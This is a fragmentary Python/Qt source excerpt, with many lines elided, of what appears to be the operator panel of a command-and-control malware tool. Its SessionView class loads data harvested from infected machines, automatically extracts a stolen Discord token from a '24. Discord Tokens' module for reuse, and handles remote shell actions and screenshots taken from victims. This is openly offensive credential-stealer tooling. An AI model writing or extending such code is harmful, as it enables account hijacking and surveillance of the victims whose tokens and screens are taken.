...
# REMOVED: decryption_util is no longer used in the UI
...
class SessionView(QWidget):
    """The main view for interacting with a single C2 session."""
    ...
    def __init__(self, db_manager):
        ...
        # REMOVED: Decryption signal is no longer needed
    ...
    def load_session(self, session_id, session_data, status):
        ...
        # UPDATED: Load all existing vault data into the new data harvest pane
        for module_name, data_packet in session_data.items():
            if module_name not in ["metadata", "status", "alias"] and data_packet is not None:
                # The update_view function now expects the module name and the full data packet
                self.data_harvest_pane.update_view(module_name, data_packet)

        # Automatically load the harvested Discord token, if available
        discord_module = session_data.get("24. Discord Tokens", {})
        if discord_module:
            token_data = discord_module.get("output", {}).get("data")
            if token_data and isinstance(token_data, str) and "Token:" in token_data:
                # Extract the first token found in the text blob
                first_token = token_data.split("Token:")[1].split("\n")[0].strip()
                if first_token:
                    self.discord_pane.load_token_from_c2(first_token)
        ...
        if is_offline:
            for pane in live_interaction_panes:
                ...
                if index != -1: self.tabs.setTabEnabled(index, False)
            ...
            if action == "shell":
                ...
                try:
                    ...
                    if not pixmap.isNull():
                        ...
                        dialog.exec()
                    else: raise ValueError("Decoded data is not a valid image.")
                except Exception as e:
                    self.events_pane.add_event(f"[{datetime.now():%H:%M:%S}] [ERROR] Could not display screenshot: {e}")
        else:
            self.data_harvest_pane.update_view(module_name, data_packet)

    # REMOVED: handle_decryption is no longer needed